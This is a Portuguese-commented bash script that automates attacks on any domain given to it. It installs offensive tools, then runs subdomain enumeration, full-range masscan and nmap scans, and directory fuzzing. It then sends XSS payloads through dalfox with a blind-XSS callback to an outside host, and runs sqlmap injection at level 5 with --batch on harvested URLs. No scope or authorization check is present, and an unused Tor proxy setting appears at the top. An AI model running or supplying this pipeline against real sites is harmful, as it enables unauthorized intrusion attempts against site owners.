#!/bin/bash

INPUT=$1
OUT_DIR_BASE="/root/recon"
PROXY="socks5://127.0.0.1:9050"

if [ -z "$INPUT" ]; then
    echo "[-] Uso: $0 <domínio> ou <arquivo.txt>"
    exit 1
fi

install_tool() {
    TOOL=$1
    INSTALL_CMD=$2
    if ! command -v $TOOL &> /dev/null; then
        echo "[-] $TOOL não instalado. Instalando..."
        eval $INSTALL_CMD
        export PATH=$PATH:$(go env GOPATH)/bin
    fi
}

install_tool "subfinder" "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
install_tool "assetfinder" "go install github.com/tomnomnom/assetfinder@latest"
install_tool "amass" "sudo apt install amass -y"
install_tool "httpx" "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
install_tool "aquatone" "go install github.com/michenriksen/aquatone@latest"
install_tool "masscan" "sudo apt install masscan -y"
install_tool "nmap" "sudo apt install nmap -y"
install_tool "ffuf" "go install github.com/ffuf/ffuf@latest"
install_tool "waybackurls" "go install github.com/tomnomnom/waybackurls@latest"
install_tool "gf" "go install github.com/tomnomnom/gf@latest"
install_tool "dalfox" "go install github.com/hahwul/dalfox/v2@latest"
install_tool "sqlmap" "sudo apt install sqlmap -y"
install_tool "sublist3r" "git clone https://github.com/aboul3la/Sublist3r.git && cd Sublist3r && sudo apt install python3 -y && sudo pip3 install -r requirements.txt"
install_tool "whatweb" "sudo apt install whatweb -y"
install_tool "wappalyzer" "npm install -g wappalyzer"
install_tool "nuclei" "go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"

if [[ -f "$INPUT" ]]; then
    echo "[+] Lendo domínios do arquivo: $INPUT"
    TARGETS=$(cat $INPUT)
else
    echo "[+] Alvo único: $INPUT"
    TARGETS=$INPUT
fi

for TARGET in $TARGETS; do
    OUT_DIR="$OUT_DIR_BASE/$TARGET"
    mkdir -p $OUT_DIR

    echo "[+] Buscando subdomínios de $TARGET com taxa reduzida..."
    subfinder -d $TARGET -rate-limit 20 | tee $OUT_DIR/subdomains.txt
    sleep 5
    assetfinder --subs-only $TARGET | tee -a $OUT_DIR/subdomains.txt
    sleep 5
    amass enum -passive -d $TARGET | tee -a $OUT_DIR/subdomains.txt
    sublist3r -d $TARGET -o $OUT_DIR/sublist3r_subdomains.txt
    sort -u $OUT_DIR/subdomains.txt $OUT_DIR/sublist3r_subdomains.txt -o $OUT_DIR/final_subdomains.txt

    echo "[+] Filtrando subdomínios ativos de $TARGET com Httpx..."
    cat $OUT_DIR/final_subdomains.txt | httpx -silent -o $OUT_DIR/alive_subdomains.txt
    sleep 5

    echo "[+] Capturando screenshots de $TARGET com Aquatone..."
    cat $OUT_DIR/alive_subdomains.txt | aquatone -threads 2 -out $OUT_DIR/screenshots
    sleep 5

    echo "[+] Escaneando portas de $TARGET com Masscan..."
    sudo masscan -p1-65535 --rate=5000 -iL $OUT_DIR/alive_subdomains.txt -oG $OUT_DIR/masscan_results.txt
    sleep 5

    echo "[+] Obtendo detalhes das portas de $TARGET com Nmap..."
    PORTS=$(awk '/Ports:/{print $3}' $OUT_DIR/masscan_results.txt | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')
    if [ -n "$PORTS" ]; then
        nmap -sC -sV -p$PORTS -iL $OUT_DIR/alive_subdomains.txt -oN $OUT_DIR/nmap_results.txt
    else
        echo "[-] Nenhuma porta identificada pelo Masscan."
    fi
    sleep 5

    echo "[+] Buscando diretórios ocultos de $TARGET com FFuF..."
    ffuf -u https://$TARGET/FUZZ -w /root/tools/SecLists/Discovery/Web-Content/common.txt -fc 403,404 -p 0.2 -o $OUT_DIR/ffuf_results.json
    sleep 5

    echo "[+] Extraindo URLs antigas de $TARGET..."
    waybackurls $TARGET | tee $OUT_DIR/urls.txt
    sleep 5

    echo "[+] Extraindo parâmetros XSS de $TARGET com GF..."
    cat $OUT_DIR/urls.txt | gf xss | tee $OUT_DIR/xss_params.txt
    sleep 5

    echo "[+] Testando XSS de $TARGET com Dalfox..."
    if [[ -s "$OUT_DIR/xss_params.txt" ]]; then
        cat $OUT_DIR/xss_params.txt | dalfox url -b yourxsshunter.com --delay 300 | tee $OUT_DIR/xss_results.txt
    else
        echo "[-] Nenhum parâmetro XSS encontrado."
    fi
    sleep 5

    echo "[+] Testando SQL Injection de $TARGET com SQLMap..."
    sqlmap -m $OUT_DIR/urls.txt --batch --random-agent --level=5 --delay 5 | tee $OUT_DIR/sqlmap_results.txt
    sleep 5

    echo "[+] Identificando tecnologias de $TARGET com WhatWeb..."
    whatweb $TARGET | tee $OUT_DIR/whatweb_results.txt
    sleep 5

    echo "[+] Identificando tecnologias de $TARGET com Wappalyzer..."
    wappalyzer -u $TARGET | tee $OUT_DIR/wappalyzer_results.txt
    sleep 5

    echo "[+] Testando vulnerabilidades de $TARGET com Nuclei..."
    nuclei -target $TARGET -o $OUT_DIR/nuclei_results.txt
    sleep 5

    echo "[✓] Recon de $TARGET finalizado! Resultados salvos em $OUT_DIR/"
    echo "----------------------------------------"

done

echo "[✓] Recon finalizado para todos os alvos!"

